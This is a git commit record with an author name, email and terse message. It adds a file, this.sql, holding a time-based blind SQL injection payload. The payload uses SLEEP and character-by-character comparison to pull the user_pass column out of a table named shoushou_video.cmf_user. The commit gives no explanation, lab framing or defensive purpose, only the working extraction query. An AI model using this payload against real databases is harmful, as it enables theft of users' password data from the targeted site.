0a0b1dd712156fd78f2e53dc9ac81dfc23d617a7
LAPTOP-TGV01QNG\lenovo <eddie222.diamoand@gmail.com>
2021-02-07 20:08:17 +0800

    F

---
+++ this.sql
@@ -0,0 +1,16 @@
+( SELECT
+	5024 
+	FROM
+		(
+		SELECT
+			(
+				SLEEP(2- 
+				(IF( ORD(
+							MID(
+							( 
+							   SELECT IFNULL( CAST( user_pass AS NCHAR ), 0x20 ) 
+								 FROM shoushou_video.cmf_user 
+								 ORDER BY user_pass LIMIT 417, 1 ), 1, 1 ))> 32,
+							0,
+						2 
+	))))) KVoj)
